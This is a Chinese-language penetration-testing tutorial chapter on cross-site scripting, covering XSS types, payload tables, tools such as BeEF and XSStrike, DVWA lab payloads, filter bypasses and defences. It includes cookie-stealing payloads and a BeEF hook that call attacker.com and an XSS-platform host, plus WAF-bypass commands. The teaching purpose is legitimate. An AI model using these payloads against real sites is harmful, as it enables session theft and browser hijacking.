# Chapter 4: XSS 跨站脚本攻击

## 4.1 XSS 简介

XSS (Cross-Site Scripting) 跨站脚本攻击，是一种代码注入攻击。攻击者通过在网页中注入恶意 JavaScript 代码，当用户访问被注入恶意代码的页面时，攻击者的脚本会在用户浏览器中执行。

## 4.2 XSS 类型

### 4.2.1 反射型 XSS

反射型 XSS 是非持久化的攻击，恶意代码作为用户请求的一部分提交到服务器，服务器未经处理地将恶意代码反射回浏览器。

**特点：**
- 需要欺骗用户点击恶意链接
- 恶意代码不存储在服务器端
- 常见于搜索功能

**攻击示例：**
```
http://example.com/search?q=<script>alert('XSS')</script>
```

### 4.2.2 存储型 XSS

存储型 XSS 是持久化攻击，恶意代码被永久存储在目标服务器端。

**特点：**
- 恶意代码存储在服务器端
- 影响所有访问该页面的用户
- 常见于留言板、评论区

**攻击示例：**
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

### 4.2.3 DOM 型 XSS

DOM 型 XSS 不需要服务器参与，完全在客户端通过 DOM 操作触发。

**特点：**
- 恶意代码在客户端执行
- 不经过服务器
- 基于 JavaScript 的 DOM 操作

## 4.3 XSS 常用攻击向量

| 类型 | 代码 | 说明 |
|------|------|------|
| 弹窗测试 | `<script>alert('XSS')</script>` | 最基本的测试 |
| 图片触发 | `<img src=x onerror=alert('XSS')>` | 图片错误时触发 |
| 事件触发 | `<svg onload=alert('XSS')>` | SVG 加载时触发 |
| iframe 嵌入 | `<iframe src="javascript:alert('XSS')">` | iframe 触发 |
| 钓鱼链接 | `<a href="javascript:alert('XSS')">点击</a>` | 伪链接点击 |
| body 触发 | `<body onload=alert('XSS')>` | 页面加载时触发 |
| 伪协议 | `<a href="javascript:alert('XSS')">` | JavaScript 伪协议 |

## 4.4 XSS 攻击工具

### 4.4.1 Beef-XSS

BeEF (Browser Exploitation Framework) 是最强大的 XSS 利用框架。

**安装：**
```bash
# Kali 已预装
# 或手动安装
sudo apt install beef-xss
```

**启动：**
```bash
# 启动 BeEF
sudo beef-xss

# 默认信息
# URL: http://127.0.0.1:3000/hook.js
# UI: http://127.0.0.1:3000/ui/panel
# 账号: beef / beef
```

**使用步骤：**
1. 启动 BeEF
2. 在 XSS 注入点插入 hook
3. 等待受害者访问
4. 在 BeEF 控制台控制浏览器

**Hook 代码：**
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

**BeEF 模块：**

| 模块 | 功能 |
|------|------|
| Browser | 浏览器信息、插件、Cookie |
| Persistence | 维持持久化、弹窗重定向 |
| Social Engineering | 钓鱼攻击、虚假通知 |
| Network | 探测内网、端口扫描 |
| Host | 主机信息、截屏 |

**常用命令：**
```javascript
// 获取 Cookie
beef.debug("Cookie: " + document.cookie);

// 弹窗
beef.debug("XSS Triggered");

// 重定向
window.location = "http://attacker.com";
```

### 4.4.2 XSStrike

自动化 XSS 漏洞检测和利用工具。

**安装：**
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**使用：**
```bash
# 扫描 URL
python xsstrike.py -u "http://target.com/search?q=test"

# 扫描文件
python xsstrike.py -l test.txt

# POST 表单
python xsstrike.py -u "http://target.com/login" --data "user=admin&pass=test"

# 绕过 WAF
python xsstrike.py -u "http://target.com/search?q=test" --encode
```

### 4.4.3 dalfox

Go 编写的 XSS 漏洞扫描工具。

**安装：**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**使用：**
```bash
# 扫描 URL
dalfox url "http://target.com?q=test"

# 扫描文件
dalfox file urls.txt

# POST 数据
dalfox url "http://target.com/login" -d "user=admin&pass=test"

# 绕过
dalfox url "http://target.com?q=test" -w
```

### 4.4.4 XSSer

自动化 XSS 检测工具。

**使用：**
```bash
# 基本扫描
xsser -u "http://target.com"

# POST 扫描
xsser --post "user=admin&pass=123" -u "http://target.com/login"

# 绕过 WAF
xsser -u "http://target.com" --proxy http://127.0.0.1:8080
```

## 4.5 XSS 实战靶场

### DVWA XSS 练习

**Low 级别：**
```html
<script>alert('XSS')</script>
```

**Medium 级别：**
```html
# 大小写混合
<ScRiPt>alert('XSS')</sCrIpT>

# 双重标签
<script>alert('XSS')</script><script>alert('XSS')</script>

# img 标签
<img src=x onerror=alert('XSS')>
```

**High 级别：**
```html
# 利用 DOM
<img src="x" onerror="alert('XSS')">

# svg 标签
<svg onload="alert('XSS')">

# 过滤绕过
<body onload=alert('XSS')>
```

### XSS盲注

使用 XSS 平台接收数据：

```html
<script>new Image().src="http://xssplatform.com/?c="+document.cookie</script>
```

## 4.6 XSS 绕过技术

### 4.6.1 大小写混合

```html
<ScRiPt>alert('XSS')</sCrIpT>
```

### 4.6.2 标签替换

```html
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### 4.6.3 编码绕过

```html
# URL 编码
%3Cscript%3Ealert('XSS')%3C/script%3E

# Unicode 编码
\u003cscript\u003ealert('XSS')\u003c/script\u003e

# HTML 实体
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 4.6.4 空格过滤

```html
# 使用 /
<script/src="x"onerror=alert('XSS')>
```

### 4.6.5 括号过滤

```html
# 使用 throw
<img src=x onerror="throw alert('XSS')">
```

## 4.7 XSS 防御

### 4.7.1 输入过滤
```php
$input = preg_replace('/<script>/i', '', $input);
```

### 4.7.2 输出编码
```php
$output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

### 4.7.3 内容安全策略 (CSP)
```http
Content-Security-Policy: script-src 'self'
Content-Security-Policy: default-src 'self'
```

### 4.7.4 HttpOnly Cookie
```php
setcookie("session", $value, 0, "/", "", true, true);
```

### 4.7.5 防御总结

| 防御措施 | 说明 |
|----------|------|
| 输入验证 | 严格验证用户输入 |
| 输出编码 | 根据上下文适当编码 |
| CSP | 限制脚本来源 |
| HttpOnly | 防止 Cookie 被窃取 |
| WAF | Web 应用防火墙 |
